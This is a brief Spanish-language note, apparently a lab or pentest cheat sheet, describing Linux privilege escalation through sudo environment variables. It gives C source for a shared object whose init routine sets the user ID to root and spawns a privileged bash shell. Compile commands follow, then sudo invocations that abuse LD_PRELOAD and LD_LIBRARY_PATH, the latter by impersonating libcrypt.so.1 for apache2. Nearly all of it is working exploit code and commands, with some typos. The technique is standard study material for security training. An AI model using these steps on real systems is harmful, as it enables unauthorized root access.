Creamos un objeto usando

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Ejecutamos el programa via sudo

```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

ejecutamos ldd via apaceh2

```
ldd /usr/sbin/apache2
```

Creamos el objeto con el mism onobmre que la libreria

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Ejecutamos apache via sudo

```
sudo LD_LIBRARY_PATH=/tmp apache2
```
